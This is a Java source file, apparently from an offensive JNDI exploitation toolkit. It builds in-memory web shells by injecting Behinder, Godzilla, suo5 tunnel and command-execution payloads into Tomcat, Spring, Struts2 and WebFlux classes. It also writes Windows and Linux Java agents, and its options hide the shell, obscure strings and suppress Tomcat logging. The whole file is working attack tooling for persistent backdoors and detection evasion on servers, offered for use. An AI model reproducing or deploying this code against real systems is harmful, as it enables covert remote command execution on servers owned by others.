package com.qi4l.jndi.gadgets.utils;

import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.template.Agent.LinMenshell;
import com.qi4l.jndi.template.Agent.WinMenshell;
import com.qi4l.jndi.template.memshell.tomcat.TFJMX;
import javassist.*;
import org.apache.commons.codec.binary.Base64;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.List;

import static com.qi4l.jndi.gadgets.Config.MemShellPayloads.*;
import static com.qi4l.jndi.template.memshell.shell.MemShellPayloads.SUO5.CMD_SHELL_FOR_WEBFLUX;

public class InjShell {
    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
        String name = ctClass.getName();
        name = name.substring(name.lastIndexOf(".") + 1);

        // 大多数 SpringBoot 项目使用内置 Tomcat
        boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
        boolean isWebflux = name.contains("Webflux");

        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
        String method = "";
        if (name.contains("SpringControllerMS")) {
            method = "drop";
        } else if (name.contains("Struts2ActionMS")) {
            method = "executeAction";
        }

        List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        for (CtClass value : classes) {
            String className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                method = Config.KEY_METHOD_MAP.get(className);
                break;
            }
        }

        // 命令执行、各种内存马
        insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(Config.HEADER_KEY) + ";");
        insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(Config.HEADER_VALUE) + ";");

        if ("bx".equals(type)) {
            try {
                ctClass.getDeclaredMethod("base64Decode");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
            }

            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            }

            try {
                ctClass.getDeclaredMethod("getMethodByClass");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
            }

            try {
                ctClass.getDeclaredMethod("getMethodAndInvoke");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            }

            if (Config.IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_UNSAFE), ctClass));
            }

            String shell = "";
            if (isTomcat) {
                insertTomcatNoLog(ctClass);
                shell = Config.IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
            } else {
                shell = Config.IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
            }

            insertMethod(ctClass, method, Utils.base64Decode(shell).replace("f359740bd1cda994", Config.PASSWORD));
        } else if ("gz".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");
            insertField(ctClass, "PASS", "String PASS = " + converString(Config.PASSWORD_ORI) + ";");

            try {
                ctClass.getDeclaredMethod("base64Decode");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
            }

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            if (isWebflux) {
                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
            } else {
                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
            }
        } else if ("gzraw".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
        } else if ("suo5".equals(type)) {

            // 先写入一些需要的基础属性
            insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
            insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");

            // 依次写入方法
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_CREATE), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_DATA), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_DEL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_SET_STREAM), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_STATUS), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_U32_TO_BYTES), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_BYTES_TO_U32), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_MARSHAL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_UNMARSHAL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_SOCKET), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_REQ), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_PROCESS_DATA_BIO), ctClass));

            // 为恶意类设置 Runnable 接口以及 RUN 方法
            CtClass runnableClass = ClassPool.getDefault().get("java.lang.Runnable");
            ctClass.addInterface(runnableClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.RUN), ctClass));

            // 插入关键方法
            insertMethod(ctClass, method, Utils.base64Decode(SUO5.SUO5));
        } else if ("execute".equals(type)) {
            insertField(ctClass, "TAG", "public static String TAG = \"" + Config.CMD_HEADER_STRING + "\";");
            insertCMD(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));

            insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
        } else if ("ws".equals(type)) {
            insertCMD(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
        } else if ("upgrade".equals(type)) {
            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            insertCMD(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(UPGRADE_SHELL));
        } else {
            insertCMD(ctClass);
            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");

            if (isWebflux) {
                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_WEBFLUX));
            } else if (isTomcat) {
                insertTomcatNoLog(ctClass);
                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
            } else {
                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
            }
        }

        ctClass.setName(ClassNameUtils.generateClassName());
        insertField(ctClass, "pattern", "public static String pattern = " + converString(Config.URL_PATTERN) + ";");

    }

    // 恶心一下人，实际没用
    public static String converString(String target) {
        if (Config.IS_OBSCURE) {
            StringBuilder result = new StringBuilder("new String(new byte[]{");
            byte[]        bytes  = target.getBytes();
            for (int i = 0; i < bytes.length; i++) {
                result.append(bytes[i]).append(",");
            }
            return result.substring(0, result.length() - 1) + "})";
        }

        return "\"" + target + "\"";
    }

    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
        //添加到类路径，防止出错
        ClassPool pool;
        pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TFJMX.class));
        // 根据传入的不同参数，在不同方法中插入不同的逻辑
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.setBody(payload);
    }

    /**
     * 向指定类中写入命令执行方法 execCmd
     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
     *
     * @param ctClass 指定类
     * @throws Exception 抛出异常
     */
    public static void insertCMD(CtClass ctClass) throws Exception {

        if (Config.IS_OBSCURE) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            }
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD_OBSCURE), ctClass));
        } else {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
        }
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }

    public static String insertWinAgent(CtClass ctClass) throws Exception {

        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }

        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Agent.WinMenshell");
        Field    WinClassName = ctClazz.getDeclaredField("className");
        WinClassName.setAccessible(true);
        WinClassName.set(ctClazz, className);
        Field WinclassBody = ctClazz.getDeclaredField("classBody");
        WinclassBody.setAccessible(true);
        WinclassBody.set(ctClazz, bytes);
        return WinMenshell.class.getName();
    }

    public static void TinsertWinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }

        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Agent.WinMenshell");
        Field    WinClassName = ctClazz.getDeclaredField("className");
        WinClassName.setAccessible(true);
        WinClassName.set(ctClazz, className);
        Field WinclassBody = ctClazz.getDeclaredField("classBody");
        WinclassBody.setAccessible(true);
        WinclassBody.set(ctClazz, bytes);
    }

    public static String insertLinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }
        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Agent.LinMenshell");
        Field    LinClassName = ctClazz.getDeclaredField("className");
        LinClassName.setAccessible(true);
        LinClassName.set(ctClazz, className);
        Field LinclassBody = ctClazz.getDeclaredField("classBody");
        LinclassBody.setAccessible(true);
        LinclassBody.set(ctClazz, bytes);
        return LinMenshell.class.getName();
    }

    public static void TinsertLinAgent(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        String className = null;
        for (CtClass value : classes) {
            className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                break;
            }
        }
        byte[]   bytes        = ctClass.toBytecode();
        Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Agent.LinMenshell");
        Field    LinClassName = ctClazz.getDeclaredField("className");
        LinClassName.setAccessible(true);
        LinClassName.set(ctClazz, className);
        Field LinclassBody = ctClazz.getDeclaredField("classBody");
        LinclassBody.setAccessible(true);
        LinclassBody.set(ctClazz, bytes);
    }

    //路由中内存马主要执行方法
    public static String structureShell(Class<?> payload) throws Exception {
        //初始化全局配置
        Config.init();
        String    className = "";
        ClassPool pool;
        CtClass   ctClass;
        pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload));
        ctClass = pool.get(payload.getName());
        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Config.Shell_Type);
        ctClass.setName(ClassNameUtils.generateClassName());
        if (Config.winAgent) {
            className = insertWinAgent(ctClass);
            ctClass.writeFile();
            return className;
        }
        if (Config.linAgent) {
            className = insertLinAgent(ctClass);
            ctClass.writeFile();
            return className;
        }
        if (Config.HIDE_MEMORY_SHELL) {
            switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                case 1:
                    break;
                case 2:
                    CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                    newClass.setName(ClassNameUtils.generateClassName());
                    String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                    className = "className=\"" + ctClass.getName() + "\";";
                    newClass.defrost();
                    newClass.makeClassInitializer().insertBefore(content);
                    newClass.makeClassInitializer().insertBefore(className);

                    if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                        CtClass superClass = pool.get(abstTranslet.getName());
                        newClass.setSuperclass(superClass);
                    }

                    className = newClass.getName();
                    newClass.writeFile();
                    return className;
            }
        }
        className = ctClass.getName();
        ctClass.writeFile();
        return className;
    }

    public static String structureShellTom(Class<?> payload) throws Exception {
        Config.init();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload));
        CtClass ctClass = pool.get(payload.getName());
        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Config.Shell_Type);
        ctClass.setName(ClassNameUtils.generateClassName());
        if (Config.winAgent) {
            TinsertWinAgent(ctClass);
            return injectClass(WinMenshell.class);
        }
        if (Config.linAgent) {
            TinsertLinAgent(ctClass);
            return injectClass(WinMenshell.class);
        }
        if (Config.HIDE_MEMORY_SHELL) {
            switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                case 1:
                    break;
                case 2:
                    CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                    newClass.setName(ClassNameUtils.generateClassName());
                    String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                    String className = "className=\"" + ctClass.getName() + "\";";
                    newClass.defrost();
                    newClass.makeClassInitializer().insertBefore(content);
                    newClass.makeClassInitializer().insertBefore(className);

                    if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                        CtClass superClass = pool.get(abstTranslet.getName());
                        newClass.setSuperclass(superClass);
                    }

                    return injectClass(newClass.getClass());
            }
        }
        return injectClass(ctClass.getClass());
    }

    //类加载方式，因类而异
    public static String injectClass(Class clazz) {

        String classCode = null;
        try {
            //获取base64后的类
            classCode = Util.getClassCode(clazz);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";
    }

    public static void insertTomcatNoLog(CtClass ctClass) throws Exception {

        try {
            ctClass.getDeclaredMethod("getFieldValue");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodByClass");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodAndInvoke");
        } catch (NotFoundException e) {
            if (Config.IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
            } else {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            }
        }

        ctClass.addMethod(CtMethod.make(Utils.base64Decode(TOMCAT_NO_LOG), ctClass));
    }
}